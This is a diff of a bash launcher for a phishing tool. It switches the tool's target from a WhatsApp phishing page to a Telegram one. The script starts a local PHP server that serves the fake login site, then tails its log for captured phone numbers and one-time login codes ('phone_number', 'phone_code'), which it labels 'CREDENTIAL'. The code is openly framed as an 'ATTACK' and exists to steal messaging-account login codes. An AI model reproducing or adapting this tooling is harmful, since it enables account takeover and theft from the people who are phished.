@@ -32,11 +32,11 @@ clear
 chmod 777 Logo.sh
 ./Logo.sh
 echo ""
-echo -e $'\e[1;32m\e[0m\e[1;32m WHATSAPP ATTACK  \e[0m'
+echo -e $'\e[1;32m\e[0m\e[1;32m TELEGRAM ATTACK  \e[0m'
 echo -e $'\e[1;37m\e[0m\e[1;37m --------------------- > > >\e[0m'
 echo ""
 banner(){
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp \e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Telegram \e[0m\n"
 printf "\n"
 }
 banner
@@ -46,7 +46,7 @@ banner
 			 
 
                   01)cd sites/
-                  cd whatsapp-phishing/
+                  cd telegram/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
@@ -61,7 +61,7 @@ banner
                   echo ""
                   echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                   echo ""
-                  tail -f log.txt | grep -e "number" -e "OTP" -e "otp"      
+                  tail -f log.txt | grep -e "phone_number" -e "phone_code"     
 
                 ;;
 
